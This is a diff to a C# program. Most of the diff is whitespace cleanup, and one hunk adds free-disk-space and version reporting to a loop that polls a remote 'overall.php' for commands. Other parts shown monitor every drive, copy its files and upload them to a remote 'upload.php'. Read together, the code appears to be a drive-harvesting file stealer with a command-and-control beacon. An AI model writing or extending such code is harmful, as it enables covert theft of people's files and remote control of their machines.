@@ -34,7 +34,7 @@ internal class Program
             }
             catch (Exception e) { ErrorLogUpload(e, "Start Error"); }
         }
-        
+
         StreamReader configFile = new StreamReader("config.txt");
         SaveRoot = configFile.ReadLine();
         urlP1 = configFile.ReadLine();
@@ -77,7 +77,7 @@ internal class Program
                 foreach (string path in filesInS)
                 {
                     if (path == "") continue;
-                    
+
                     try
                     {
                         HttpUploadFile(classRegistered + "upload.php", path, "file", "unknown");
@@ -105,11 +105,14 @@ internal class Program
 
         void getCommand()
         {
-            var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "VALIDATE", "GTC Kaliumdichromat Project" } });
+            
             while (true)
             {
                 using (HttpClient client = new HttpClient())
                 {
+                    DriveInfo drive = new DriveInfo(Path.GetPathRoot(SaveRoot));
+                    double freeSpace = (double)drive.TotalFreeSpace / 1024.0 / 1024.0 / 1024.0;
+                    var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "VALIDATE", "GTC Kaliumdichromat Project" }, { "remains", Convert.ToString(freeSpace) }, { "version", version } });
                     client.DefaultRequestHeaders.UserAgent.ParseAdd("GTC Software Studio - ACE_Project (priority:00A) && Kaliumdichromat_Project (sub of ACE_Project)");
                     // Console.WriteLine(response.Content.ReadAsStringAsync().Result);
                     string[] commands = client.PostAsync(classRegistered + "overall.php", content).Result.Content.ReadAsStringAsync().Result.Split('\n');
@@ -345,13 +348,13 @@ internal class Program
                 copyRoot[fileCnt, 1] = localSaveRoot + file.FullName.Substring(3);
             }
         }
-        
+
 
         DriveInfo[] allDrivesG = DriveInfo.GetDrives();
         Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
         Console.OutputEncoding = Encoding.Unicode;
-        
-        
+
+
         foreach (DriveInfo item in allDrivesG)
         {
             if (item.IsReady)
@@ -367,7 +370,7 @@ internal class Program
         foreach (bool n in registeredDrive)
         { /*Console.WriteLine(n);*/ }
 
-        
+
         while (true)
         {
             DriveInfo[] allDrives = DriveInfo.GetDrives();
@@ -439,12 +442,12 @@ internal class Program
             allDrives = null;
             visited = null;
             Thread.Sleep(1000);
-        
+
         }
-        
-        
+
+
     }
-    static void ErrorLogUpload(Exception e ,string Name)
+    static void ErrorLogUpload(Exception e, string Name)
     {
         using (HttpClient client = new HttpClient())
         {
